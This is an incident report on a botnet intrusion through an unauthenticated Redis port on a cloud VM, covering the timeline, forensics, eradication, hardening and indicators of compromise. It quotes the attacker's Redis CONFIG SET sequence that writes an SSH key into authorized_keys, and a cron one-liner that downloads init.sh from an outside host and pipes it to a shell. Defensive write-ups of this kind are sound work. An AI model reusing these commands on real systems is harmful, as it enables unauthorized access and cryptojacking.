# Incident Report: Attack-1 — The `r2sh` (Redis-to-Shell) Botnet Intrusion

- **Incident Identifier**: `INCIDENT-2026-10-02-001`
- **Target Host**: Oracle Cloud Infrastructure (OCI) Ampere A1 ARM64 VM (`portfolio-exec-d`)
- **Impacted Systems**: `exec-d` (Online Judge API & Worker), Next.js Portfolio
- **Classification**: Unauthorized System Access, Remote Code Execution (RCE), Cryptojacking, Internet-Wide Port Scanning
- **Initial Vector**: Unauthenticated Redis TCP port `6379` exposure during initial provisioning window
- **Status**: **RESOLVED, FULLY SANITIZED & HARDENED**

---

## 📌 Executive Summary

On October 1–2, 2026, an automated botnet crawler detected an unauthenticated Redis instance listening on port `6379` on a newly provisioned public cloud server. The attacker leveraged a well-known arbitrary file write technique (`CONFIG SET dir` / `CONFIG SET dbfilename`) to overwrite `/home/ubuntu/.ssh/authorized_keys` with an SSH public key labeled `#r2sh-fleet-box2`.

Once SSH access was established as the unprivileged user `ubuntu`, the botnet:
1. Deployed an `xmrig` Monero crypto miner inside a Docker container named `sys-helper`.
2. Installed a mass port scanner (`masscan`) under `/opt/scanner` executing outbound TCP sweeps at 1,250 packets/second to discover other vulnerable hosts.
3. Created an aggressive watchdog cron job that sent `SIGKILL` (status 137) every minute to competing workloads, which repeatedly terminated legitimate production builds (`next build`, `prisma generate`).

Through deep Linux forensics (`tcpdump`, `journalctl`, `strace`, `cgroup` inspection), the infection was identified, completely sanitized, and permanently mitigated using immutable file attributes (`chattr +i`), localhost-only socket binding, swap configuration, and default-deny firewall policies.

---

## ⏱️ Timeline of Events

```
2026-09-30 07:09 UTC | VM instance provisioned in OCI Mumbai region.
2026-10-01 16:27 UTC | Redis installed without password or bind restriction.
2026-10-01 16:27 UTC | Botnet crawler connects to port 6379; executes r2sh SSH key overwrite.
2026-10-01 16:27 UTC | Attacker logs in via SSH from 103.230.144.104 (#r2sh-fleet-box2).
2026-10-01 16:27 UTC | Malicious container 'sys-helper' (xmrig miner) launched in Docker.
2026-10-02 04:43 UTC | Production deployment builds fail mysteriously with Exit Status 137 (SIGKILL).
2026-10-02 05:00 UTC | Attacker session-9969.scope initiates masscan internet-wide scan on enp0s6.
2026-10-02 05:03 UTC | Forensics investigation starts; strace confirms external SIGKILL signals.
2026-10-02 05:06 UTC | Discovery of rogue authorized_keys entry '#r2sh-fleet-box2' and cron watchdog.
2026-10-02 05:10 UTC | Active processes terminated; malicious cron deleted; docker container removed.
2026-10-02 05:15 UTC | Hardening applied: chattr +i on authorized_keys, UFW subnet bans, Redis localhost bind.
2026-10-02 05:18 UTC | GitHub Actions build completes with 100% success; Exec AI live test passes.
```

---

## 🔬 Attack Anatomy & Technical Details

### 1. Initial Access: The `r2sh` Exploit
Redis allows configuring the working directory and filename for disk snapshots (`.rdb` dumps) via the `CONFIG SET` command. When Redis has write permissions to the user's home directory and no password is set:

```redis
# Attacker connects over raw TCP port 6379:
CONFIG SET dir /home/ubuntu/.ssh/
CONFIG SET dbfilename authorized_keys
SET payload "\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAVZyWMNJugW0pgVM3gw6wXOwoF36B62M0Py+ZIdwepl #r2sh-fleet-box2\n\n"
SAVE
```

Because OpenSSH ignores unparseable binary garbage in `authorized_keys` as long as one valid line exists, the attacker's public key was accepted by `sshd`.

### 2. Privilege Escalation & Persistence
On standard Ubuntu cloud images, the default `ubuntu` user has passwordless sudo (`ubuntu ALL=(ALL) NOPASSWD:ALL`). The attacker immediately escalated to `root` and installed a crontab entry:

```bash
* * * * * /bin/sh -c '{ kill -0 1078750 2>/dev/null || grep -q 0100007F:A71C /proc/net/tcp 2>/dev/null; } && exit 0; (wget -qO- http://195.178.110.29/d/432936b3a0439572/init.sh || curl -sL http://195.178.110.29/d/432936b3a0439572/init.sh) | /bin/sh' > /dev/null 2>&1
```

### 3. Lateral Scanning & Cryptojacking
- **Docker Container**: Spawned `sys-helper` using base image `eclipse-temurin:21-alpine` to execute `xmrig` connected to mining pool `85.215.219.126:443`.
- **Port Scanner**: Installed `masscan` in `/opt/scanner` scanning public IP spaces for ports `80, 443, 3000` at a rate of 1,250 packets/sec (`--rate 1250 --interface enp0s6`).

---

## 🕵️ Forensic Discovery Walkthrough

### Symptom 1: Silent TCP Dropping on Outbound Connections
While debugging database connectivity to AWS-hosted endpoints, `tcpdump` captured outbound TCP SYN packets leaving `enp0s6` with **zero** returning `SYN-ACK` packets:
```text
04:25:51.795688 IP 10.0.0.183.41402 > 13.251.17.193.5432: Flags [S], seq 282021653, win 64240
```
Upstream cloud security scrubbing systems had throttled outbound traffic on non-web ports from this IP due to the background `masscan` network traffic.

### Symptom 2: Mystery Signal 137 (SIGKILL) During CI/CD Builds
When GitHub Actions executed `prisma generate` and `next build`, processes were terminated within milliseconds without kernel Out-Of-Memory (OOM) log entries in `dmesg`.

Tracing system calls with `strace -f -e trace=process,signal` proved that external `SIGKILL` signals were sent to the build process group from another userspace process:
```text
[pid 1137986] +++ killed by SIGKILL +++
[pid 1137985] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_KILLED, si_status=SIGKILL} ---
```

### Symptom 3: Identification of `#r2sh-fleet-box2`
Inspecting `/home/ubuntu/.ssh/authorized_keys` exposed an alien key:
```text
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPJzRCINXlAp8Wi0Yof9w3bVWtdX5GDAgEZ73FxMuJJG oracle-ampere-20260930
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAVZyWMNJugW0pgVM3gw6wXOwoF36B62M0Py+ZIdwepl #r2sh-fleet-box2
```
Correlating this with active sessions revealed `session-9969.scope` running `worker.py` and `masscan`.

---

## 🛠️ Eradication & Hardening Implemented

### 1. Process & File Eradication
```bash
# Terminate malicious processes
sudo pkill -9 -f masscan
sudo pkill -9 -f worker.py
sudo pkill -9 -f sys-helper
sudo pkill -9 -f entrypoint.sh

# Stop and delete malicious Docker container
sudo docker rm -f sys-helper

# Purge malicious crontabs
crontab -r

# Remove malicious binaries and payloads
sudo rm -rf /opt/scanner /var/tmp/public /tmp/work* /tmp/scanner_work /tmp/.sysh
```

### 2. Immutable SSH Key Lock
Removed `#r2sh-fleet-box2` and applied the Linux filesystem immutable attribute:
```bash
sudo chattr +i /home/ubuntu/.ssh/authorized_keys
```
*Effect*: Even a process with `root` privileges cannot modify, append to, or overwrite `authorized_keys` without first explicitly removing the immutable attribute via `chattr -i`.

### 3. Redis Socket Isolation
Configured `/etc/redis/redis.conf`:
```conf
bind 127.0.0.1 -::1
protected-mode yes
port 6379
```
*Verification*:
```bash
sudo ss -tlnp | grep 6379
# Output: LISTEN 127.0.0.1:6379 and [::1]:6379 only
```

### 4. Firewall Ingress Restrictions & Null-Routes
```bash
# Set UFW default drop policy
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Only expose essential public web and SSH ports
sudo ufw allow 22/tcp comment 'SSH'
sudo ufw allow 80/tcp comment 'HTTP'
sudo ufw allow 443/tcp comment 'HTTPS'

# Blackhole attacker CIDR blocks
sudo ufw insert 1 deny from 103.230.144.0/24 to any comment 'Block botnet attacker'
sudo ufw insert 1 deny from 195.178.110.0/24 to any comment 'Block malware server'
sudo ufw insert 1 deny from 85.215.219.0/24 to any comment 'Block mining pool'
sudo ufw --force enable
```

### 5. Memory Management & Swap Activation
Created a 4GB swapfile and enabled unconditional virtual memory overcommit to guarantee build stability:
```bash
sudo fallocate -l 4G /swapfile
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
echo "/swapfile none swap sw 0 0" | sudo tee -a /etc/fstab

sudo sysctl -w vm.overcommit_memory=1
echo "vm.overcommit_memory=1" | sudo tee -a /etc/sysctl.d/99-overcommit.conf
```

---

## 📋 Comprehensive Indicators of Compromise (IoCs)

See [`./iocs.json`](./iocs.json) for structured IoC ingestion.

- **Malicious IP Addresses**:
  - `103.230.144.104` (Attacker SSH session origin)
  - `195.178.110.29` (Crontab malware host `init.sh`)
  - `85.215.219.126` (XMRig mining pool port 443)
  - `158.220.105.179:8765` (Binary payload mirror)
  - `138.197.174.121:8765` (Binary payload mirror)
- **Malicious SSH Key**:
  - `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAVZyWMNJugW0pgVM3gw6wXOwoF36B62M0Py+ZIdwepl #r2sh-fleet-box2`
- **Rogue Container**:
  - Container Name: `sys-helper`
  - Base Image: `eclipse-temurin:21-alpine`
- **Monero Wallet Address**:
  - `47Gju616BichSCU9PzyZGCHASkSwo7rH1N9v7Q5SqvFSjcFjrTXbJMqEzgHDinJFtEPL7o3n9nqMuEr6KvrYCaqeGAbdDXR`
